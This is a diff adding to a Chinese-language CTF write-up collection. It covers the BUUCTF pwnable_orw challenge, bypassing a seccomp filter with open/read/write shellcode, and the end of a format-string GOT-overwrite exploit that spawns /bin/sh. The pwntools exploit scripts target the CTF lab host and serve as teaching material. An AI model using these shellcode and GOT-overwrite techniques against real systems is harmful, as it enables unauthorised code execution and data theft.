@@ -944,7 +944,7 @@ io.interactive()
 
 ------
 
-### [[第五空间2019 决赛]PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)
+### ♥ [[第五空间2019 决赛]PWN5](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)
 
 先`file ./pwn  `查看文件类型，再`checksec --file=./pwn  `检查文件保护情况。
 
@@ -1160,6 +1160,126 @@ system_plt = e.plt['system']
 payload = fmtstr_payload(10, {atoi_got: system_plt})
 io.sendline(payload)
 io.sendline(b'/bin/sh\x00')
+io.interactive()
+```
+
+------
+
+### [pwnable_orw](https://buuoj.cn/challenges#pwnable_orw)
+
+先`file ./orw  `查看文件类型，再`checksec --file=./orw  `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./orw
+./orw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./orw
+[*] '/home/tyd/ctf/pwn/buuctf/orw'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 32bit`打开`orw`后按`F5`反汇编源码并查看主函数。可以看到英语病句`"Give my your shellcode:"`，应该是`"me"`才对。问题不大，`read()`函数读取了`0xC8`字节的`shellcode`，并进行执行。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  orw_seccomp();
+  printf("Give my your shellcode:");
+  read(0, &shellcode, 0xC8u);
+  ((void (*)(void))shellcode)();
+  return 0;
+}
+```
+
+直接调用`asm(shellcraft.sh())`尝试写入`shellcode`失败。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29109)
+shellcraft = asm(shellcraft.sh())
+io.recvline(b'Give my your shellcode:')
+io.sendline(shellcraft)
+io.interactive()
+```
+
+审计`orw_seccomp()`函数，源码如下：
+
+```c
+unsigned int orw_seccomp()
+{
+  __int16 v1; // [esp+4h] [ebp-84h] BYREF
+  char *v2; // [esp+8h] [ebp-80h]
+  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF
+  unsigned int v4; // [esp+6Ch] [ebp-1Ch]
+
+  v4 = __readgsdword(0x14u);
+  qmemcpy(v3, &unk_8048640, sizeof(v3));
+  v1 = 12;
+  v2 = v3;
+  prctl(38, 1, 0, 0, 0);
+  prctl(22, 2, &v1);
+  return __readgsdword(0x14u) ^ v4;
+}
+```
+
+`prctl(38, 1, 0, 0, 0);`表示禁止提权，比如`system`和`onegadget`都不能用了。`prctl(22, 2, &v1);`限制了能执行系统调用的函数。`seccomp`是`Linux`系统的一种安全机制，主要功能是限制直接通过`syscall`去调用某些系统函数。我们可以用`seccomp-tools`去分析程序的`seccomp`状态。
+
+```bash
+sudo gem install seccomp-tools
+```
+
+通过`seccomp-tools`发现可以使用`open`，`read`，`write`这三个函数。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ seccomp-tools dump ./orw
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
+ 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
+ 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
+ 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
+ 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
+ 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
+ 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
+ 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
+ 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+```
+
+返回主函数，双击`shellcode`变量跳转到`.bss`段，`shellcode`直接写入到起始地址为`0x804A060`的`.bss`段。
+
+```assembly
+.bss:0804A060                 public shellcode
+.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p
+......
+.bss:0804A127 _bss            ends
+```
+
+`open`打开`flag`文件，`read`读取`flag`中的文件到`esp`寄存器中，`write`将`esp`中`flag`文件内容写入到标准输出中进行输出显示。编写`Python`代码连接`node4.buuoj.cn`的监听端口`29109`，发送`shellcode`可得`flag{11d4fea3-05ec-4f32-b5ad-d51908da309f}`，提交即可。
+
+```python
+from pwn import *
+
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 29109)
+bss_addr = 0x804A060
+shellcode = shellcraft.open('flag')
+shellcode += shellcraft.read('eax', 'esp', 0x100)
+shellcode += shellcraft.write(1, 'esp', 0x100)
+shellcode += shellcraft.exit(0)
+io.sendline(asm(shellcode))
 io.interactive()
 ```
 
@@ -2184,7 +2304,7 @@ io.interactive()
     PIE:      PIE enabled
 ```
 
-使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。
+使用`IDA pro 32bit`打开附件`wustctf2020_number_game`，按`F5`反汇编源码并查看主函数。
 
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
